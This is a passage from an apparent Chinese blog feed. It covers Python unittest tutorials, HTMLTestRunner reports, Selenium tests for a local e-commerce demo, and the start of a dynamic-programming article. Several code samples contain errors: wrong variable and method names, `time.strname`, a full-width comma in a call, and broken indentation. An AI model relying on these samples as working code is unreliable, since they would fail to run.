class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mymath</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jia</span><span class="params">(self,a,b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jian</span><span class="params">(self,a,b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> a-b</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">changfa</span><span class="params">(self,a,b)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> a/b</span><br><span class="line"></span><br><span class="line"><span class="comment">#代码功能验证</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    mm = mymath()</span><br><span class="line">    actualValue = m.jia(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">    expectValue = <span class="number">5</span></span><br><span class="line">    <span class="keyword">if</span> actualValue==expectValue:</span><br><span class="line">        print(<span class="string">"加法功能实现正确"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        actualValue==mm.jia(<span class="string">"a"</span>,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"该方法功能实现正确"</span>，e)</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line"><span class="comment">#导包</span></span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> myMath <span class="keyword">import</span> mymath</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建单元测试类(继承自unittest.testcase)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myMathTest</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#测试用例资源初始化方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.mm = mymath()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#测试用例方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_add_1</span><span class="params">(self)</span>:</span></span><br><span class="line">        actualValue = self.mm.jia(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">        expectValue = <span class="number">3</span></span><br><span class="line">        <span class="comment">#断言</span></span><br><span class="line">        self.assertEqual(actualValue,expectValue,<span class="string">"预期结果不一致"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_add_2</span><span class="params">(self)</span>:</span></span><br><span class="line">        actualValue = self.mm.jia(<span class="string">"abc"</span>,<span class="string">"def"</span>)</span><br><span class="line">        expectValue = <span class="string">"abcdef"</span></span><br><span class="line">        self.assertEqual(actualValue,expectValue,<span class="string">"预期结果不一致"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_floor_1</span><span class="params">(self)</span>:</span></span><br><span class="line">        actualValue = self.mm.chufa(<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">        expectValue = <span class="string">"abcdef"</span></span><br><span class="line">        self.assertEqual(actualValue,expectValue,<span class="string">"预期结果不一致"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#测试用例的资源释放</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tearDown</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#unittest.main()</span></span><br><span class="line">    <span class="comment">#直接使用discover</span></span><br><span class="line">    discover=unittest.defaultTestLoader.discover(<span class="string">r"./20200408/"</span>,pattern=<span class="string">"myMathTest.py"</span>)</span><br><span class="line">    <span class="comment">#使用runner运行器运行测试集  "a"追加模式</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">r"./20200408/re.txt"</span>,<span class="string">"a"</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        runner=unittest.TextTestRunner(f,description=<span class="string">"用于测试math类的用例执行"</span>,verbosity=<span class="number">2</span>)</span><br><span class="line">        runner.run(discover)</span><br></pre></td></tr></table></figure><p>maintest.py</p><blockquote><p>主测试文件,不是用来写测试用的,而是用来组织测试用来执行的</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613396353835.png" alt="1613396353835"></p><h3 id="HTML测试文档"><a href="#HTML测试文档" class="headerlink" title="HTML测试文档"></a>HTML测试文档</h3><h5 id="HTMLTestRunner模块"><a href="#HTMLTestRunner模块" class="headerlink" title="HTMLTestRunner模块"></a>HTMLTestRunner模块</h5><p>安装HTMLTestRunner.py到python的安装目录下/lib中</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install html-TestRunner</span><br></pre></td></tr></table></figure><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> HTMLTestRunner <span class="keyword">import</span> HTMLTestRunner</span><br><span class="line"></span><br><span class="line"><span class="comment">#path=os.path.dirname(__file__)当前目录</span></span><br><span class="line">path=os.path.dirname(__file__)+<span class="string">r"/"</span></span><br><span class="line">filename=time.strname(<span class="string">"%Y-%m-%d-%H-%M-%S"</span>) + <span class="string">r".html"</span></span><br><span class="line">filename = path + filename</span><br><span class="line"><span class="comment">#修改代码</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r"./20200408/result.html"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">runner=unittest.HTMLTestRunner(f,verbosity=<span class="number">2</span>,title=<span class="string">"单元测试报告"</span>,description=<span class="string">"第一次运行的结果"</span>)</span><br><span class="line">runner.run(discover)</span><br></pre></td></tr></table></figure><p>注释</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613572049278.png" alt="1613572049278"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613572027235.png" alt="1613572027235"></p><h3 id="邮件自动化"><a href="#邮件自动化" class="headerlink" title="邮件自动化"></a>邮件自动化</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613574779605.png" alt="1613574779605"></p><h3 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h3><p>项目目录结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---public(模块,例如注册,登录,退出)</span><br><span class="line">---test_cases(测试用例)</span><br><span class="line">---test_datas(测试数据,例如csv文件)</span><br><span class="line">---test_report(测试报告)</span><br></pre></td></tr></table></figure><p>电商系统/public/loginModule.py</p><blockquote><p>登录模块</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">very_login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self,driver)</span>:</span></span><br><span class="line">        self.driver=driver</span><br><span class="line">        self.driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">        self.driver.get(<span class="string">"http://localhost/verydows/"</span>)</span><br><span class="line">        <span class="comment">#点击登录</span></span><br><span class="line">        self.driver.find_element_by_link_text(<span class="string">"登录"</span>).click()</span><br><span class="line">        <span class="comment">#输入用户名密码</span></span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">'//*[@id="username"]'</span>).send_keys(<span class="string">"kayleh"</span>)</span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">'//*[@id="password"]'</span>).send_keys(<span class="string">"123456"</span>)</span><br><span class="line">        <span class="comment">#点击登录按钮</span></span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">'//*[@id="login-form"]/div/a'</span>).click()</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">       </span><br><span class="line">    <span class="comment">#退出登录</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(self,driver)</span>:</span></span><br><span class="line">        self.driver=driver</span><br><span class="line">        ele=self.driver.find_element_by_xpath(<span class="string">'//*[@id="top-userbar"]/a'</span>)</span><br><span class="line">        ActionChains(self.driver).move_to_element(ele).perform()</span><br><span class="line">        self.driver.find_element_by_link_text(<span class="string">"退出"</span>).click()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#退出浏览器对象</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitB</span><span class="params">(self,driver)</span>:</span></span><br><span class="line">        self.driver=driver</span><br><span class="line">        self.driver.quit()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    driver=webdriver.Chrome()</span><br></pre></td></tr></table></figure><p>电商系统/testcases/verydows_user_update.py</p><blockquote><p>更新用户信息</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#os.path.dirname(os.path.dirname(__file__))是这个文件的目录的上一级目录(电商系统)</span></span><br><span class="line">path=os.path.dirname(os.path.dirname(__file__))+<span class="string">r"/public"</span></span><br><span class="line"><span class="comment">#添加到环境变量</span></span><br><span class="line">path1=sys.path</span><br><span class="line">path1.append(path)</span><br><span class="line"><span class="keyword">from</span> loginModule <span class="keyword">import</span> very_login</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">verydows_user_update</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.ll = very_login()</span><br><span class="line">        self.driver=webdriver.Chrome()</span><br><span class="line">        self.ll.login(self.driver)</span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_user_01</span><span class="params">(self)</span>:</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">''</span>).click()</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">''</span>).clear()</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">''</span>).send_keys(<span class="string">"petter"</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">        self.driver.find_element_by_xpath(<span class="string">''</span>).clear()</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        <span class="comment">#修改完验证</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tearDown</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.ll.logout(self.driver)</span><br><span class="line">        self.ll.quitB(self.driver)</span><br><span class="line">    actualValue=self.driver.find_element_by_xpath(<span class="string">''</span>).get_attribute(<span class="string">"value"</span>)</span><br><span class="line">        expectValue=<span class="string">"peter"</span></span><br><span class="line">        self.assertEqual(actualValue,expectValue)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure><p>电商系统/testcases/verydows_reg_true.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">filename = os.path.dirname(os.path.dirname(__file__))+<span class="string">r"/test_datas/data_csv.csv"</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">verydows_reg_true</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_reg_01</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(filename,<span class="string">"r"</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data=csv.reader(f)</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">                driver.get(<span class="string">"http://localhost/verydows/"</span>)</span><br><span class="line">                driver.find_element_by_link_text(<span class="string">"免费注册"</span>).click()</span><br><span class="line">                driver.find_element_by_id(<span class="string">"username"</span>).send_keys(d[<span class="number">0</span>])</span><br><span class="line">                driver.find_element_by_id(<span class="string">"email"</span>).send_keys(d[<span class="number">1</span>])</span><br><span class="line">                driver.find_element_by_id(<span class="string">"password"</span>).send_keys(d[<span class="number">2</span>])</span><br><span class="line">                driver.find_element_by_id(<span class="string">"repassword"</span>).send_keys(d[<span class="number">3</span>])</span><br><span class="line">                driver.find_element_by_link_text(<span class="string">"立即注册"</span>).click()</span><br><span class="line">                </span><br><span class="line">                <span class="comment">#因为有一个中间页面的跳转，此处要强制等待一下，让他跳转过去</span></span><br><span class="line">                time.sleep(<span class="number">2</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment">#断言</span></span><br><span class="line">                <span class="comment">#expectUrl="http://localhost/verydows/index.php?c=user&amp;a=index"</span></span><br><span class="line">                <span class="comment">#actualUrl=driver.current_url</span></span><br><span class="line">                </span><br><span class="line">                expectValue=d[<span class="number">4</span>]</span><br><span class="line">                actualValue=driver.find_element_by_xpath(<span class="string">'//....'</span>).text()</span><br><span class="line">                </span><br><span class="line">                <span class="comment">#if expectValue==actualValue:</span></span><br><span class="line"><span class="comment">#print("注册username反向测试用例通过")</span></span><br><span class="line">                <span class="comment">#else:</span></span><br><span class="line">                <span class="comment">#    print("注册username反向用例不通过")</span></span><br><span class="line">                self.assertEqual(expectValue,actualValue)</span><br><span class="line">                </span><br><span class="line">                <span class="comment">#关闭浏览器对象</span></span><br><span class="line">                driver.quit()</span><br><span class="line">               </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tearDown</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure><p>电商系统/maintest.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在此文件中调度测试用例执行</span></span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> HTMLTestRunner <span class="keyword">import</span> HTMLTestRunner</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"></span><br><span class="line">pathCase=os.path.dirname(__file__)+<span class="string">r"/test_cases/"</span></span><br><span class="line">pathReport=os.path.dirname(__file__)+<span class="string">r"/test_cases/"</span></span><br><span class="line"></span><br><span class="line">filename=time.strname(<span class="string">"%Y-%m-%d-%H-%M-%S"</span>) + <span class="string">r".html"</span></span><br><span class="line">filename=pathReport+filename</span><br><span class="line">discover = unittest.defaultTestLoader.discover(path,pattern=<span class="string">r"verydows*.py"</span>) </span><br><span class="line"><span class="keyword">with</span> open(filename,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">runner=unittest.HTMLTestRunner(f,verbosity=<span class="number">2</span>,title=<span class="string">"自动化测试用例报告"</span>,description=<span class="string">"XX"</span>)</span><br><span class="line">runner.run(discover)</span><br></pre></td></tr></table></figure><h2 id="Unittest下的数据驱动测试"><a href="#Unittest下的数据驱动测试" class="headerlink" title="Unittest下的数据驱动测试"></a>Unittest下的数据驱动测试</h2><p>数据存储</p><blockquote><p>测试脚本与测试数据分离</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613756103321.png" alt="1613756103321"></p><p>不导入ddt模块，字典只会形成一条测试用例</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613756685341.png" alt="1613756685341"></p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613756748533.png" alt="1613756748533"></p><h4 id="excel"><a href="#excel" class="headerlink" title="excel"></a>excel</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613756844713.png" alt="1613756844713"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613756873832.png" alt="1613756873832"></p><p>xldr</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613757056609.png" alt="1613757056609"></p><p>excelutil.py</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613757120441.png" alt="1613757120441" style="zoom:67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613757139743.png" alt="1613757139743" style="zoom:80%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613757341191.png" alt="1613757341191"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/kayleh/cdn3/Unitest-framework/1613147342997.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>Katalon Recorder (Selenium tests generator)</title>
    <link href="https://kayleh.top/automated-test-katalon/"/>
    <id>https://kayleh.top/automated-test-katalon/</id>
    <published>2021-02-01T18:42:57.000Z</published>
    <updated>2021-02-01T18:50:15.292Z</updated>
    
    <content type="html"><![CDATA[<p>和Selenium IDE类似的工具</p><h4 id="Katalon-Recorder-Selenium-tests-generator"><a href="#Katalon-Recorder-Selenium-tests-generator" class="headerlink" title="Katalon Recorder (Selenium tests generator)"></a>Katalon Recorder (Selenium tests generator)</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;和Selenium IDE类似的工具&lt;/p&gt;
&lt;h4 id=&quot;Katalon-Recorder-Selenium-tests-generator&quot;&gt;&lt;a href=&quot;#Katalon-Recorder-Selenium-tests-generator&quot; class=&quot;hea
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>Dynamic programming动态规划</title>
    <link href="https://kayleh.top/dynamic-programming/"/>
    <id>https://kayleh.top/dynamic-programming/</id>
    <published>2021-01-31T18:54:04.000Z</published>
    <updated>2021-01-31T19:17:10.266Z</updated>
    
    <content type="html"><![CDATA[<p>动态规划</p><p><strong>首先，动态规划问题的一般形式就是求最值</strong>。动态规划其实是运筹学的一种最优化方法，只不过在计算机问题上应用比较多，比如说让你求<strong>最长</strong>递增子序列呀，<strong>最小</strong>编辑距离呀等等。</p><p>既然是要求最值，核心问题是什么呢？<strong>求解动态规划的核心问题是穷举</strong>。因为要求最值，肯定要把所有可行的答案穷举出来，然后在其中找最值呗。</p><p>动态规划这么简单，就是穷举就完事了？我看到的动态规划问题都很难啊！</p><p>首先，动态规划的穷举有点特别，因为这类问题<strong>存在「重叠子问题」</strong>，如果暴力穷举的话效率会极其低下，所以需要「备忘录」或者「DP table」来优化穷举过程，避免不必要的计算。</p><p>而且，动态规划问题一定会<strong>具备「最优子结构」</strong>，才能通过子问题的最值得到原问题的最值。</p><p>另外，虽然动态规划的核心思想就是穷举求最值，但是问题可以千变万化，穷举所有可行解其实并不是一件容易的事，只有列出<strong>正确的「状态转移方程」</strong>才能正确地穷举。</p><p>以上提到的重叠子问题、最优子结构、状态转移方程就是动态规划三要素。具体什么意思等会会举例详解，但是在实际的算法问题中，<strong>写出状态转移方程是最困难的</strong>，这也就是为什么很多朋友觉得动态规划问题困难的原因，我来提供我研究出来的一个思维框架，辅助你思考状态转移方程：</p><p><strong>明确 base case -&gt; 明确「状态」-&gt; 明确「选择」 -&gt; 定义 dp 数组/函数的含义</strong>。</p><p>按上面的套路走，最后的结果就可以套这个框架：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化 base case</span></span><br><span class="line">dp[<span class="number">0</span>][<span class="number">0</span>][...] = base</span><br><span class="line"><span class="comment"># 进行状态转移</span></span><br><span class="line"><span class="keyword">for</span> 状态<span class="number">1</span> <span class="keyword">in</span> 状态<span class="number">1</span>的所有取值：</span><br><span class="line">    <span class="keyword">for</span> 状态<span class="number">2</span> <span class="keyword">in</span> 状态<span class="number">2</span>的所有取值：</span><br><span class="line">        <span class="keyword">for</span> ...</span><br><span class="line">            dp[状态<span class="number">1</span>][状态<span class="number">2</span>][...] = 求最值(选择<span class="number">1</span>，选择<span class="number">2.</span>..)</span><br></pre></td></tr></table></figure><p>下面通过斐波那契数列问题和凑零钱问题来详解动态规划的基本原理。前者主要是让你明白什么是重叠子问题（斐波那契数列没有求最值，所以严格来说不是动态规划问题），后者主要举集中于如何列出状态转移方程。</p><h3 id="一、斐波那契数列"><a href="#一、斐波那契数列" class="headerlink" title="一、斐波那契数列"></a>一、斐波那契数列</h3><p>请读者不要嫌弃这个例子简单，<strong>只有简单的例子才能让你把精力充分集中在算法背后的通用思想和技巧上，而不会被那些隐晦的细节问题搞的莫名其妙</strong>。想要困难的例子，历史文章里有的是。</p><p><strong>1、暴力递归</strong></p><p>斐波那契数列的数学形式就是递归的，写成代码就是这样：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (N == <span class="number">1</span> || N == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> fib(N - <span class="number">1</span>) + fib(N - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS：但凡遇到需要递归的问题，最好都画出递归树，这对你分析算法的复杂度，寻找算法低效的原因都有巨大帮助。</p><p>这个递归树怎么理解？就是说想要计算原问题 <code>f(20)</code>，我就得先计算出子问题 <code>f(19)</code> 和 <code>f(18)</code>，然后要计算 <code>f(19)</code>，我就要先算出子问题 <code>f(18)</code> 和 <code>f(17)</code>，以此类推。最后遇到 <code>f(1)</code> 或者 <code>f(2)</code> 的时候，结果已知，就能直接返回结果，递归树不再向下生长了。</p><p><strong>递归算法的时间复杂度怎么计算？就是用子问题个数乘以解决一个子问题需要的时间。</strong></p><p>首先计算子问题个数，即递归树中节点的总数。显然二叉树节点总数为指数级别，所以子问题个数为 O(2^n)。</p><p>然后计算解决一个子问题的时间，在本算法中，没有循环，只有 <code>f(n - 1) + f(n - 2)</code> 一个加法操作，时间为 O(1)。</p><p>所以，这个算法的时间复杂度为二者相乘，即 O(2^n)，指数级别，爆炸。</p><p>观察递归树，很明显发现了算法低效的原因：存在大量重复计算，比如 <code>f(18)</code> 被计算了两次，而且你可以看到，以 <code>f(18)</code> 为根的这个递归树体量巨大，多算一遍，会耗费巨大的时间。更何况，还不止 <code>f(18)</code> 这一个节点被重复计算，所以这个算法及其低效。</p><p>这就是动态规划问题的第一个性质：<strong>重叠子问题</strong>。下面，我们想办法解决这个问题。</p><p><strong>2、带备忘录的递归解法</strong></p><p>明确了问题，其实就已经把问题解决了一半。即然耗时的原因是重复计算，那么我们可以造一个「备忘录」，每次算出某个子问题的答案后别急着返回，先记到「备忘录」里再返回；每次遇到一个子问题先去「备忘录」里查一查，如果发现之前已经解决过这个问题了，直接把答案拿出来用，不要再耗时去计算了。</p><p>一般使用一个数组充当这个「备忘录」，当然你也可以使用哈希表（字典），思想都是一样的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span 